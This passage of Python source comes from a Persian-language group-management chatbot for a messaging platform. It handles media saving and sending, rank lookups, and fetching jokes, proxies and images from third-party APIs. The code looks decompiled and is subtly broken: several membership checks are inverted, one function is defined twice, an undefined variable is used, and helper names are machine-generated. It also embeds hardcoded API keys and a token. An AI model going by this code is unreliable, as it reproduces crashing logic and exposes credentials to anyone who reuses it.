                                    save_info_messages(ResultME, object_guid, message_id, ismanagerms)
                                return False
                            if not filename.endswith('.' + format):
                                filename += '.' + format
                            if os.path.isfile('Downloads/' + filename):
                                if tag_name == 'image':
                                    ResultME = client.send_image(object_guid, 'Downloads/' + filename, message_id, text)
                                elif tag_name == 'video':
                                    ResultME = client.send_video(object_guid, 'Downloads/' + filename, message_id, text)
                                elif tag_name == 'voice':
                                    ResultME = client.send_voice(object_guid, 'Downloads/' + filename, message_id, text, time=1)
                                elif tag_name == 'audio':
                                    ResultME = client.send_music(object_guid, 'Downloads/' + filename, message_id, text, time=1, performer='l\u200c8\u200cP\u200cB\u200cO\u200cT')
                                elif tag_name == 'gif':
                                    ResultME = client.send_gif(object_guid, 'Downloads/' + filename, message_id, text)
                                if save:
                                    save_info_messages(ResultME, object_guid, message_id, ismanagerms)
                                return False
        for st in filterlist:
            if st in text:
                next_word = Font_close(st)
                text = text.replace(st, next_word)
        for st in LISTFILTERPRO:
            if st in text:
                next_word = Font_filter(st)
                text = text.replace(st, next_word)
        return text

    def save_info_messages(ResultME, object_guid, message_id, ismanagerms=False):
        SETTING_KEYS = list(INFOS[object_guid]['setting'])
        if ResultME and ResultME != True and ('message_update' in ResultME):
            if int(SETTING_KEYS[13]):
                if len(TimeMessages) >= 20:
                    TimeMessages.pop(0)
                TimeMessages.append(get_iran_timestamp())
            message_sended_id = ResultME['message_update']['message_id']
            if object_guid in LSMessage:
                LSMessage[object_guid] = [0, 1]
            LSMessage[object_guid][0] = message_sended_id
            LSMessage[object_guid][0] = message_sended_id
            if int(SETTING_KEYS[0]) and int(SETTING_KEYS[1]):
                if object_guid in ARMessages:
                    ARMessages[object_guid] = []
                if len(ARMessages[object_guid]) >= 50:
                    ARMessages[object_guid].pop(0)
                ARMessages[object_guid].append(message_sended_id)
            if ismanagerms and int(SETTING_KEYS[11]):
                if object_guid not in STMessages:
                    STMessages[object_guid] = []
                if len(STMessages[object_guid]) >= 100:
                    STMessages[object_guid].pop(0)
                if message_id in STMessages[object_guid]:
                    STMessages[object_guid].append(message_id)
                return None
        return None

    def send_message(OBJM, text, message_id=None, metadata=True):
        if OBJM['TIP'] > 3:
            sleepmod = 0
        else:
            sleepmod = int(OBJM['SETTING_KEYS'][15])
        if not text or text is True or text is False or text is None:
            return
        if sleepmod == 0 and (not OBJM['silentMod']):
            for st in LISTFILTERPRO:
                if st in text:
                    next_word = Font_filter(st)
                    text = text.replace(st, next_word)
            if metadata:
                text = meta_data_text(text)
            text = text_make_type(text, OBJM['INFOOBJECT']['types']['type'])
            text = text_make_font(text, OBJM['INFOOBJECT']['types']['font'])
            if OBJM['istimer']:
                message_id = None
            ResultME = client.send_text(OBJM['object_guid'], text, message_id)
            save_info_messages(ResultME, OBJM['object_guid'], message_id, OBJM['ismanagerms'])
            if object_guid in PROTECTED:
                PROTECTED[object_guid] = 0
            else:
                PROTECTED[object_guid] = 0
        return True

    def send_message_limited(OBJM, text, metadata=None):
        sleepmod = 0
        if OBJM['TIP'] > 3:
            sleepmod = 0
        else:
            sleepmod = int(OBJM['SETTING_KEYS'][15])
        if sleepmod == 0 and OBJM['silentMod']:
            return
        for st in OBJM['INFOOBJECT']['filterlist']:
            if st in text:
                next_word = Font_close(st)
                text = text.replace(st, next_word)
        for st in LISTFILTERPRO:
            if st in text:
                next_word = Font_filter(st)
                text = text.replace(st, next_word)
        if metadata:
            text = meta_data_text(text)
        text = text_make_type(text, OBJM['INFOOBJECT']['types']['type'])
        text = text_make_font(text, OBJM['INFOOBJECT']['types']['font'])
        message_id = None
        if OBJM['istimer']:
            message_id = None
        ResultME = client.send_text(OBJM['object_guid'], text, message_id)
        save_info_messages(ResultME, OBJM['object_guid'], message_id, OBJM['ismanagerms'])
        if object_guid in PROTECTED:
            PROTECTED[object_guid] = 0
        else:
            PROTECTED[object_guid] = 0
        return True

    def send_message_limited(OBJM, text, message_id=None, metadata=None):
        if OBJM['TIP'] > 3:
            sleepmod = 0
        else:
            sleepmod = int(OBJM['SETTING_KEYS'][15])
        if sleepmod == 0 and (not OBJM['silentMod']):
            for st in OBJM['INFOOBJECT']['filterlist']:
                if st in text:
                    next_word = Font_close(st)
                    text = text.replace(st, next_word)
            for st in LISTFILTERPRO:
                if st in text:
                    next_word = Font_filter(st)
                    text = text.replace(st, next_word)
            if metadata:
                text = meta_data_text(text, **metadata)
            text = text_make_type(text, OBJM['INFOOBJECT']['types']['type'])
            text = text_make_font(text, OBJM['INFOOBJECT']['types']['font'])
            if OBJM['istimer']:
                message_id = None
            ResultME = client.send_text(OBJM['object_guid'], text, message_id)
            save_info_messages(ResultME, OBJM['object_guid'], message_id, OBJM['ismanagerms'])
            if object_guid in PROTECTED:
                PROTECTED[object_guid] = 0
            else:
                PROTECTED[object_guid] = 0
        return True

    def get_ans_from_qu_pro(client, SPEAK, update_message, OBJM, command, message_id):
        for word in SPEAK:
            if word in command and len(SPEAK[word]) > 0:
                step = random.choice(SPEAK[word])
                if 'answer' in step:
                    answer = step['answer']
                    issilent = True
                else:
                    issilent = False
                if 'actions' in step and OBJM:
                    for action in step['actions']:
                        action = text_contain_tags(action, OBJM['object_guid'], OBJM['guid_sender'], OBJM['is_reply_message'])
                        if issilent:
                            action = f'{action}-'
                        update_message['message']['text'] = action
                        commands_colection(client, OBJM['object_guid'], OBJM['guid_sender'], update_message, OBJM['istimer'])
                if issilent and OBJM:
                    answer = make_dinamic_ans(answer, OBJM['guid_sender'], OBJM['object_guid'], OBJM['message_id'], istimer=OBJM['istimer'], ismanagerms=OBJM['ismanagerms'], is_reply_message=OBJM['is_reply_message'], filterlist=OBJM['INFOOBJECT']['filterlist'])
                    if answer:
                        send_message(OBJM, answer, message_id)
                if not OBJM and issilent:
                    client.send_text(OWNER, answer, message_id)
                return True
        return None
    # ziro.ir
    def get_answer(command, TIP_ANS, sp_type=None):
        global typespeak
        import requests
        step = False
        url = 'https://l8p.ir/API-SPEAK/speak.php'
        if not sp_type:
            sp_type = typespeak
        params = {'maqam': TIP_ANS, 'type_speak': sp_type, 'command': command}
        response = requests.post(url, params=params)
        if response.status_code == 200:
            step = response.json()['step']
        return step
    import random

    def get_default_ans_from_qu(client, TIP_ANS, update_message, OBJM, command, message_id):
        step = get_answer(command, TIP_ANS)
        if step:
            if 'answer' in step:
                answer = step['answer']
                issilent = True
            else:
                issilent = False
            if 'actions' in step and OBJM:
                for action in step['actions']:
                    action = text_contain_tags(action, OBJM['object_guid'], OBJM['guid_sender'], OBJM['is_reply_message'])
                    if issilent:
                        action = f'{action}-'
                    update_message['message']['text'] = action
                    commands_colection(client, OBJM['object_guid'], OBJM['guid_sender'], update_message, OBJM['istimer'])
            if issilent and OBJM:
                answer = make_dinamic_ans(text=answer, guid_sender=OBJM['guid_sender'], object_guid=OBJM['object_guid'], message_id=OBJM['message_id'], istimer=OBJM['istimer'], ismanagerms=OBJM['ismanagerms'], is_reply_message=OBJM['is_reply_message'], filterlist=OBJM['INFOOBJECT']['filterlist'])
                if answer:
                    send_message(OBJM, answer, message_id)
            if not OBJM and issilent:
                client.send_text(OWNER, answer, message_id)
        return True

    def save_media_pro(OBJM, callback=False):
        list_infos = {'موزیک': {'format': 'mp3', 'nick': 'audio'}, 'ویس': {'format': 'mpeg', 'nick': 'voice'}, 'عکس': {'format': 'png', 'nick': 'image'}, 'گیف': {'format': 'mp4', 'nick': 'gif'}, 'صدا': {'format': 'mpeg', 'nick': 'voice'}, 'اهنگ': {'format': 'mp3', 'nick': 'audio'}, 'فیلم': {'format': 'mp4', 'nick': 'video'}}
        result = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        file_inline = result.get('file_inline')
        if not file_inline:
            return False
        type_message = file_inline.get('type')
        if not type_message:
            return False
        type = ListLockNames[type_message]
        if not type or type not in list_infos:
            return False
        format = list_infos[type]['format']
        nick = list_infos[type]['nick']
        if nick == 'gif':
            num = len(INLINES) + 1
            result = client.download(OBJM['object_guid'], OBJM['is_reply_message'], save=False)
            del result['file']
            INLINES[f'{nick}{str(num)}'] = result
            UPFILES(file_inlines, INLINES)
        else:
            num = 1
            fileName = f'{nick}{str(num)}.{format}'
            while os.path.isfile(f'Downloads/{fileName}'):
                num += 1
                fileName = f'{nick}{str(num)}.{format}'
            client.download(OBJM['object_guid'], OBJM['is_reply_message'], save=True, save_as=f'Downloads/{fileName}')
        if callback:
            return f'{nick}{str(num)}'
        return MPro(f"{type} با تگ #{nick}{str(num)} سیو شد. {OBJM['INFOOBJECT']['types']['ok']}")

    def send_timeout_group(OBJM, option=False):
        if 'timeout' in INFOS[OBJM['object_guid']] and INFOS[OBJM['object_guid']]['timeout']:
            timeout = INFOS[OBJM['object_guid']]['timeout']
            now = get_iran_timestamp()
            timeout_result = timeout - now
            result = Time_pass(timeout_result)
            if option:
                return f'{result} از شارژ گروه باقی مانده است.'
            return MPro(f'{result} از شارژ گروه باقی مانده است.' + OBJM['INFOOBJECT']['types']['ok'], 2)
        if option:
            return 'برای گروه شارژی تایین نشده است.'
        return MPro('برای گروه شارژی تایین نشده است.' + OBJM['INFOOBJECT']['types']['ok'], 2)

    def delete_timeout_group(OBJM):
        if 'timeout' in INFOS[OBJM['object_guid']]:
            INFOS[OBJM['object_guid']]['timeout'] = False
            return MPro('شارژ گروه حذف شد.' + OBJM['INFOOBJECT']['types']['ok'], 2)
        return MPro('برای گروه شارژی تایین نشده است.' + OBJM['INFOOBJECT']['types']['ok'], 2)

    def get_my_media_pro(OBJM, type):
        list_infos = {'موزیک': {'format': 'mp3', 'nick': 'audio'}, 'ویس': {'format': 'mpeg', 'nick': 'voice'}, 'عکس': {'format': 'png', 'nick': 'image'}, 'گیف': {'format': 'mp4', 'nick': 'gif'}, 'صدا': {'format': 'mpeg', 'nick': 'voice'}, 'اهنگ': {'format': 'mp3', 'nick': 'audio'}, 'فیلم': {'format': 'mp4', 'nick': 'video'}}
        if type in list_infos:
            format = list_infos[type]['format']
            nick = list_infos[type]['nick']
        else:
            return False
        medias = []
        if nick == 'gif':
            for key in INLINES:
                medias.append(key)
        else:
            files = [f for f in os.listdir('Downloads') if os.path.isfile(f'Downloads/{f}')]
            for file in files:
                if file.startswith(nick) and file.endswith(f'.{format}'):
                    medias.append(file)
        mess = MPro(f'لیست {type}', 4)
        if len(medias) > 0:
            for media in medias:
                mess += MPro(f"#{media.replace(f'.{format}', '')}", 2)
        else:
            mess = MPro(f"لیست {type} خالی میباشد. {OBJM['INFOOBJECT']['types']['ok']}", 3)
        return mess

    def listcomp1940():
        downloads_files = []
        for f in os.listdir('Downloads/'):
            if os.path.isfile(os.path.join('Downloads/', f)):
                downloads_files.append(f)
        return downloads_files

    def listcomp1919():
        return listcomp1940()

    def delete_all_media_pro(OBJM, type):
        list_infos = {'موزیک': {'format': 'mp3', 'nick': 'audio'}, 'ویس': {'format': 'mpeg', 'nick': 'voice'}, 'عکس': {'format': 'png', 'nick': 'image'}, 'گیف': {'format': 'mp4', 'nick': 'gif'}, 'صدا': {'format': 'mpeg', 'nick': 'voice'}, 'اهنگ': {'format': 'mp3', 'nick': 'audio'}, 'فیلم': {'format': 'mp4', 'nick': 'video'}}
        if type in list_infos:
            format = list_infos[type]['format']
            nick = list_infos[type]['nick']
        else:
            return False
        medias = []
        files = listcomp1940()
        for file in files:
            if file.startswith(nick) and file.endswith(f'.{format}'):
                medias.append(file)
        for media in medias:
            try:
                os.remove(os.path.join('Downloads', media))
            except Exception:
                pass
        return MPro(f'لیست {type} پاکسازی شد. ' + OBJM['INFOOBJECT']['types']['ok'])

    def notif_messages(update):
        if 'show_notifications' in update:
            for notif_messsage in update['show_notifications']:
                if notif_messsage['notification_id'].startswith('n_g0'):
                    message_data = notif_messsage.get('message_data')
                    title = notif_messsage.get('title')
                    text = notif_messsage.get('text').split(':')
                    user_firstname = None
                    if len(text) >= 2:
                        user_firstname = text[0]
                    object_guid = message_data.get('object_guid')
                    guid_sender = message_data.get('sender_guid')
                    if guid_sender and object_guid and user_firstname:
                        if object_guid in INFOS:
                            if object_guid not in USERS:
                                USERS[object_guid] = {}
                        if guid_sender not in USERS[object_guid]:
                            last_up_name = USERS[object_guid][guid_sender][2]
                            if last_up_name == 'اراذل' or last_up_name == 'بدون لقب':
                                USERS[object_guid][guid_sender][2] = user_firstname
        return None

    def send_tas(OBJM):
        import random
        rand_num = random.randint(1, 6)
        if rand_num == 1:
            return '⬤'
        elif rand_num == 2:
            return '⬤ ⬤'
        elif rand_num == 3:
            return '⬤ ⬤\n  ⬤'
        elif rand_num == 4:
            return '⬤ ⬤\n⬤ ⬤'
        elif rand_num == 5:
            return '⬤ ⬤\n  ⬤\n⬤ ⬤'
        elif rand_num == 6:
            return '⬤ ⬤\n⬤ ⬤\n⬤ ⬤'
        return None

    def send_version(OBJM):
        return f'v{str(NEWVR)}'

    def get_info_user_1(OBJM):
        rank = formrank(Coder, OBJM['INFOOBJECT']['admins'], OBJM['INFOOBJECT']['full_admins'], OBJM['INFOOBJECT']['owner'], OWNER, OBJM['guid_sender'])
        if OBJM['guid_sender'] not in USERS[OBJM['object_guid']]:
            getInfoUser(OBJM['object_guid'], OBJM['guid_sender'])
        result = MPro(f'مقام 〔 {rank} 〕', 4)
        result += formInfo(USERS[OBJM['object_guid']][OBJM['guid_sender']], OBJM, OBJM['guid_sender'])
        return result

    def get_link_gap(OBJM):
        result = False
        try:
            result = client.get_link(OBJM['object_guid'])
        except Exception:
            pass
        if result:
            return MPro(f"لینک دعوت گپ 〔 {OBJM['INFOOBJECT']['name']} 〕 : \n{result['join_link']}", 2)
        return MPro(f"لینک دعوت رو نمیتونم بگیرم. {OBJM['INFOOBJECT']['types']['ok']}", 2)

    def get_full_date(OBJM):
        try:
            response = requests.get(f"https://one-api.ir/time/?token=833942:64919956105c3&action=timestamp&timestamp={str(get_iran_timestamp())}&timezone='Asia/Tehran'")
            return response.json()
        except:
            pass

    def get_clock(OBJM):
        return f"» {Hour()} ⌯ {Week()} {OBJM['INFOOBJECT']['types']['ok']}"

    def get_mention_malek(OBJM):
        if OBJM['INFOOBJECT']['owner'] not in USERS[OBJM['object_guid']]:
            getInfoUser(OBJM['object_guid'], OBJM['INFOOBJECT']['owner'])
        return MPro(f"@@〔 {USERS[OBJM['object_guid']][OBJM['INFOOBJECT']['owner']][2]} 〕@@({OBJM['INFOOBJECT']['owner']})", 1)

    def get_guid_group(OBJM):
        return f"گوید گروه : ``{str(OBJM['object_guid'])}``"

    def send_seckeh(OBJM):
        if random.randint(1, 2) == 1:
            return '⦿ #شیر ⦿'
        return '⊝ #خط ⊝'

    def send_api_jock(object_guid=None, guid_sender=None):
        if isinstance(object_guid, dict):
            guid_sender = object_guid['guid_sender']
            object_guid = object_guid['object_guid']
        url = 'https://l8p.ir/API/index-api.php/jock/?key=34613461&chat_id=' + object_guid + '&user_id=' + guid_sender
        response = requests.get(url, timeout=30)
        data = response.json()
        if data['status'] == 200:
            return '⌯ #JOCK\n\n' + str(data['result']['QU'])
        return None

    def send_api_chalesh(object_guid=None, guid_sender=None):
        if isinstance(object_guid, dict):
            guid_sender = object_guid['guid_sender']
            object_guid = object_guid['object_guid']
        url = 'https://l8p.ir/API/index-api.php/chalesh/?key=34613461&chat_id=' + object_guid + '&user_id=' + guid_sender
        response = requests.get(url, timeout=30)
        data = response.json()
        if data['status'] == 200:
            return data['result']['QU']
        return None

    def send_api_bio(object_guid=None, guid_sender=None):
        if isinstance(object_guid, dict):
            guid_sender = object_guid['guid_sender']
            object_guid = object_guid['object_guid']
        url = 'https://l8p.ir/API/index-api.php/bio/?key=34613461&chat_id=' + object_guid + '&user_id=' + guid_sender
        response = requests.get(url, timeout=30)
        data = response.json()
        if data['status'] == 200:
            return '⌯ #BIO\n\n' + data['result']['QU']
        return None

    def send_api_fact(object_guid=None, guid_sender=None):
        if isinstance(object_guid, dict):
            guid_sender = object_guid['guid_sender']
            object_guid = object_guid['object_guid']
        url = 'https://l8p.ir/API/index-api.php/fact/?key=34613461&chat_id=' + object_guid + '&user_id=' + guid_sender
        response = requests.get(url, timeout=30)
        data = response.json()
        if data['status'] == 200:
            return '⌯ #FACT\n\n' + data['result']['QU']
        return None

    def send_api_etraf(object_guid=None, guid_sender=None):
        if isinstance(object_guid, dict):
            guid_sender = object_guid['guid_sender']
            object_guid = object_guid['object_guid']
        url = 'https://l8p.ir/API/index-api.php/etraf/?key=34613461&chat_id=' + object_guid + '&user_id=' + guid_sender
        response = requests.get(url, timeout=30)
        data = response.json()
        if data['status'] == 200:
            return '⌯ #ETRAF\n\n' + data['result']['QU']
        return None

    def send_api_danestani(object_guid=None, guid_sender=None):
        if isinstance(object_guid, dict):
            guid_sender = object_guid['guid_sender']
            object_guid = object_guid['object_guid']
        url = 'https://l8p.ir/API/index-api.php/dnstni/?key=34613461&chat_id=' + object_guid + '&user_id=' + guid_sender
        response = requests.get(url, timeout=30)
        data = response.json()
        if data['status'] == 200:
            return '⌯ #DANESTANI\n\n' + data['result']['QU']
        return None

    def send_api_dastan(object_guid=None, guid_sender=None):
        if isinstance(object_guid, dict):
            guid_sender = object_guid['guid_sender']
            object_guid = object_guid['object_guid']
        url = 'https://l8p.ir/API/index-api.php/story/?key=34613461&chat_id=' + object_guid + '&user_id=' + guid_sender
        response = requests.get(url, timeout=30)
        data = response.json()
        if data['status'] == 200:
            return '⌯ #STORY\n\n' + data['result']['QU']
        return None

    def send_api_textmod(object_guid=None, guid_sender=None):
        if isinstance(object_guid, dict):
            guid_sender = object_guid['guid_sender']
            object_guid = object_guid['object_guid']
        url = 'https://l8p.ir/API/index-api.php/text/?key=34613461&chat_id=' + object_guid + '&user_id=' + guid_sender
        response = requests.get(url, timeout=30)
        data = response.json()
        if data['status'] == 200:
            return '⌯ #TEXT\n\n' + data['result']['QU']
        return None

    def send_api_gang(object_guid=None, guid_sender=None):
        response = requests.get('https://haji-api.ir/gang/', timeout=30)
        data = response.content.decode('utf-8')
        return '⌯ #GANG\n\n' + data

    def send_api_angizeshi(object_guid=None, guid_sender=None):
        response = requests.get('https://haji-api.ir/angizeshi/', timeout=30)
        data = response.content.decode('utf-8')
        return '⌯ #ANGIZESHI\n\n' + data

    def send_api_zekr(object_guid=None, guid_sender=None):
        response = requests.get('https://haji-api.ir/zekr', timeout=30)
        data = response.json()
        if data['ok']:
            result = '⌯ #ZEKR\n\n'
            result += MPro(data['Result']['zekr'], 2) + MPro(data['Result']['persian'], 2) + MPro(data['Result']['info'], 2)
            return result
        return None

    def send_api_fal(object_guid=None, guid_sender=None):
        if isinstance(object_guid, dict):
            guid_sender = object_guid['guid_sender']
            object_guid = object_guid['object_guid']
        url = 'https://l8p.ir/API/index-api.php/fal/?key=34613461&chat_id=' + object_guid + '&user_id=' + guid_sender
        response = requests.get(url, timeout=30)
        data = response.json()
        if data['status'] == 200:
            title = Font_shec(data['result']['title'])
            mess = '⌯ #FAL\n\n𝗧𝗜𝗧𝗟𝗘 »\n' + MPro(title, 4) + '\n𝗥𝗛𝗬𝗠𝗘 »\n'
            lines = data['result']['rhyme'].split('\n')
            for line in lines:
                mess += MPro(line + '\n', 2)
            mess += '\n𝗠𝗘𝗔𝗡𝗜𝗡𝗚 »\n\n' + MPro(data['result']['meaning'], 2)
            return mess
        return None

    def send_nickname_me(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['message_id'])
        if message_info:
            user_guid = GetReplyGuid(message_info)
            if user_guid not in USERS[OBJM['object_guid']]:
                getInfoUser(OBJM['object_guid'], user_guid)
            nickname = USERS[OBJM['object_guid']][user_guid][2]
            if len(nickname) <= 0:
                nickname = 'بدون لقب'
            return MPro('لقبت : ' + nickname, 2)
        return None

    def send_asl_me(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['message_id'])
        if message_info:
            user_guid = GetReplyGuid(message_info)
            if user_guid:
                asl = USERS[OBJM['object_guid']][user_guid][3]
                if len(asl) <= 0:
                    asl = 'بدون اصل'
                return MPro('اصلت : ' + asl, 2)
        return None

    def send_maqam_me(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['message_id'])
        if message_info:
            user_guid = GetReplyGuid(message_info)
            if user_guid:
                rank = formrank(Coder, OBJM['INFOOBJECT']['admins'], OBJM['INFOOBJECT']['full_admins'], OBJM['INFOOBJECT']['owner'], OWNER, user_guid)
                return MPro('مقامت : ' + rank, 2)
        return None

    def send_guid_me(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['message_id'])
        if message_info:
            guid_message = MPro('گویدت : ``' + GetReplyGuid(message_info) + '``')
            return guid_message
        return None

    def send_media_welcom(OBJM):
        return OBJM['INFOOBJECT']['welcome']

    def send_media_bye(OBJM):
        return OBJM['INFOOBJECT']['bye']

    def send_banner(OBJM):
        mess = OBJM['INFOOBJECT']['baner']
        if len(mess) == 0:
            return MPro(f"بنری ثبت نشده است. {OBJM['INFOOBJECT']['types']['ok']}")
        return mess

    def send_rules(OBJM):
        return make_dinamic_ans(text=OBJM['INFOOBJECT']['rols'], guid_sender=OBJM['guid_sender'], object_guid=OBJM['object_guid'], message_id=OBJM['message_id'], istimer=OBJM['istimer'], ismanagerms=OBJM['ismanagerms'], is_reply_message=OBJM['is_reply_message'], filterlist=OBJM['INFOOBJECT']['filterlist'])

    def send_limites(OBJM):
        mess = MPro('محدودیت 〔 💀 〕', 4) + MPro('ارسال موارد زیر ممنوع است. 〔 قفل 🚫 〕\n', 2)
        locks_warning = list(OBJM['INFOOBJECT']['locks_warning'])
        locks_warning_show = list(OBJM['INFOOBJECT']['locks_warning_show'])
        locks_ban = list(OBJM['INFOOBJECT']['locks_ban'])
        for lock in Listlocks:
            key = Listlocks[lock]
            if int(OBJM['LOCKS_KEYS'][key]) == 0:
                ison, isshow = ('', '')
                if locks_ban[key] == '0':
                    ison = '🟢'
                if locks_warning_show[key] == '0':
                    isshow = '🔇'
                mess += MPro(f'{lock} 〔 {locks_warning[key]} 〕 {ison}{isshow}')
        mess += '\n'
        mess += MPro(f"تعداد اخطار : {str(OBJM['INFOOBJECT']['warnning'])}\n", 2) + MPro('دستورات زیر خاموش است. 〔 خاموش 💤 〕\n', 2)
        empty = True
        for lock in ListKeys_Names:
            res, name = ('', ListKeys_Names[lock])
            if int(OBJM['ORDERS_KEYS'][lock]) == 0:
                empty = False
                mess += MPro(name)
        if empty:
            mess += MPro('هیچ دستوری خاموش نیست')
        return mess

    def send_maqam_maker(OBJM):
        if OWNER not in USERS[OBJM['object_guid']]:
            getInfoUser(OBJM['object_guid'], OWNER)
        return MPro(f"@@〔 {USERS[OBJM['object_guid']][OWNER][2]} 〕@@({OWNER})", 1)

    def send_api_profile(OBJM):
        try:
            response = requests.get('https://api-free.ir/api/prof.php', timeout=30)
            url = response.json()['result'][0]
            response = requests.get(url, timeout=30)
            name_file = f'prof_{get_iran_timestamp()}.png'
            with open(name_file, 'wb') as file:
                file.write(response.content)
            ResultME = client.send_image(OBJM['object_guid'], name_file, OBJM['message_id'])
            save_info_messages(ResultME, OBJM['object_guid'], OBJM['message_id'], OBJM['ismanagerms'])
        except Exception as e:
            pass
        finally:
            if os.path.exists(name_file):
                os.remove(name_file)

    def send_api_background(OBJM):
        try:
            response = requests.get('https://api-free.ir/api/background.php', timeout=30)
            url = response.json()['result'][0]
            response = requests.get(url, timeout=30)
            name_file = f'prof_{get_iran_timestamp()}.png'
            with open(name_file, 'wb') as file:
                file.write(response.content)
            ResultME = client.send_image(OBJM['object_guid'], name_file, OBJM['message_id'])
            save_info_messages(ResultME, OBJM['object_guid'], OBJM['message_id'], OBJM['ismanagerms'])
        except Exception as e:
            print(e)
        finally:
            try:
                if os.path.exists(name_file):
                    os.remove(name_file)
            except:
                pass

    def send_api_procsy(object_guid=None, guid_sender=None):
        try:
            response = requests.get('https://api-free.ir/api/proxy.php', timeout=30)
            data = response.json()
            if data['ok']:
                form = ''
                m = 0
                for url in data['result']:
                    if m > 20:
                        break
                    form += f'@@PROXI@@({url}) ⌯ '
                    m += 1
                return f'⌯ #PROXIS\n\n{form}'
        except Exception as e:
            print(e)
            return None

    def send_api_photography(OBJM):
        try:
            response = requests.get('http://haji-api.ir/photography/', timeout=30)
            name_file = f'photography_{get_iran_timestamp()}.png'
            with open(name_file, 'wb') as file:
                file.write(response.content)
        except Exception:
            pass
        try:
            ResultME = client.send_image(OBJM['object_guid'], name_file, OBJM['message_id'])
            save_info_messages(ResultME, OBJM['object_guid'], OBJM['message_id'], OBJM['ismanagerms'])
        except Exception as e:
            print(f'error in send_api_photography: {e}')
        finally:
            os.remove(name_file)

    def send_api_arz(object_guid=None, guid_sender=None):
        try:
            data = requests.get('https://haji-api.ir/exchange-rate/', timeout=30).json()
            if data['ok']:
                results = data['Results']
                mess = ''
                for info in results:
                    rate = results[info]['Average']
                    mess += f'{info} : {rate}\n'
                if len(mess) > 0:
                    return f'⌯ #CURRENCY\n\n{mess}'
        except Exception:
            return None
        return None

    def send_api_deghat(object_guid=None, guid_sender=None):
        try:
            data = requests.get('https://haji-api.ir/deghat', timeout=30).content.decode('utf-8')
            return f'⌯ #DEGHAT\n\n{data}'
        except Exception:
            return None

    def send_api_hagh(object_guid=None, guid_sender=None):
        try:
            data = requests.get('https://haji-api.ir/ketab/', timeout=30).content.decode('utf-8')
            return f'⌯ #HAGH\n\n{data}'
        except Exception:
            return None

    def send_api_fal_hafez(OBJM):
        try:
            url = requests.get('https://api-free.ir/api/fal', timeout=30).json()['result']
            response = requests.get(url, timeout=30)
            name_file = f'fal_hafez_{get_iran_timestamp()}.png'
            with open(name_file, 'wb') as file:
                file.write(response.content)
        except Exception:
            pass
        try:
            ResultME = client.send_image(OBJM['object_guid'], name_file, OBJM['message_id'])
            save_info_messages(ResultME, OBJM['object_guid'], OBJM['message_id'], OBJM['ismanagerms'])
        except Exception:
            pass
        finally:
            os.remove(name_file)

    def send_random_number(object_guid=None, guid_sender=None):
        return f'°•{random.randint(1, 1000)}'

    def send_count_messages_me(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['message_id'])
        if message_info:
            user_guid = GetReplyGuid(message_info)
            if user_guid not in USERS[OBJM['object_guid']]:
                getInfoUser(OBJM['object_guid'], user_guid)
            count = MPro(f"تعداد پیامت : {USERS[OBJM['object_guid']][user_guid][0]}")
            return count
        return None

    def send_count_warnning_me(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['message_id'])
        if message_info:
            user_guid = GetReplyGuid(message_info)
            if user_guid not in USERS[OBJM['object_guid']]:
                getInfoUser(OBJM['object_guid'], user_guid)
            countwr = USERS[OBJM['object_guid']][user_guid][1]
            count = MPro(f'تعداد اخطارت : {countwr}')
            return count
        return None

    def send_api_pnp(object_guid=None, guid_sender=None):
        response = requests.get(f'https://haji-api.ir/jok/?q=51&page={random.randint(1, 47)}')
        data = response.json()
        if data['ok']:
            rand = random.randint(1, len(data['results']) - 1)
            return f"⌯ #P N P\n\n{data['results'][rand]}"
        return None

    def send_text_keshideh(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        mess = MPro('روی پیام پاک شده ریپلای زدی.' + OBJM['INFOOBJECT']['types']['ok'])
        if message_info:
            mess = Font_kesh(message_info['text'])
        return mess

    def send_text_lash(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        mess = MPro('روی پیام پاک شده ریپلای زدی.' + OBJM['INFOOBJECT']['types']['ok'])
        if message_info:
            mess = Font_lash(message_info['text'])
        return mess

    def send_text_shekasteh(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        mess = MPro('روی پیام پاک شده ریپلای زدی.' + OBJM['INFOOBJECT']['types']['ok'])
        if message_info:
            mess = Font_shec(message_info['text'])
        return mess

    def send_your_laqab(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        mess = MPro('روی پیام پاک شده ریپلای زدی.' + OBJM['INFOOBJECT']['types']['ok'])
        if not message_info:
            mess = MPro('کاربر شناسایی نشد.' + OBJM['INFOOBJECT']['types']['ok'])
        else:
            user_guid = GetReplyGuid(message_info)
            if user_guid:
                if user_guid not in USERS[OBJM['object_guid']]:
                    getInfoUser(OBJM['object_guid'], user_guid)
                nickname = USERS[OBJM['object_guid']][user_guid][2]
                if len(nickname) <= 0:
                    nickname = 'بدون لقب'
                mess = MPro('لقبش : ' + nickname)
        return mess

    def send_your_asl(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        if not message_info:
            mess = MPro('کاربر شناسایی نشد.' + OBJM['INFOOBJECT']['types']['ok'])
            return mess
        user_guid = GetReplyGuid(message_info)
        if user_guid:
            if user_guid not in USERS[OBJM['object_guid']]:
                getInfoUser(OBJM['object_guid'], user_guid)
            infouser = USERS[OBJM['object_guid']][user_guid][3]
            if len(infouser) <= 0:
                infouser = 'بدون اصل'
            mess = MPro('اصلش : ' + infouser)
        else:
            mess = MPro('روی پیام پاک شده ریپلای زدی.' + OBJM['INFOOBJECT']['types']['ok'])
        return mess

    def send_your_maqam(OBJM):
        message_info = GetInfoByMessageId(OBJM['object_guid'], OBJM['is_reply_message'])
        mess = MPro('روی پیام پاک شده ریپلای زدی.' + OBJM['INFOOBJECT']['types']['ok'])
        if message_info:
            user_guid = GetReplyGuid(message_info)
            if user_guid:
                rank = formrank(Coder, OBJM['INFOOBJECT']['admins'], OBJM['INFOOBJECT']['full_admins'], OBJM['INFOOBJECT']['owner'], OWNER, user_guid)
                mess = MPro('مقامش : ' + rank)
        return mess

    def send_your_guid(OBJM):
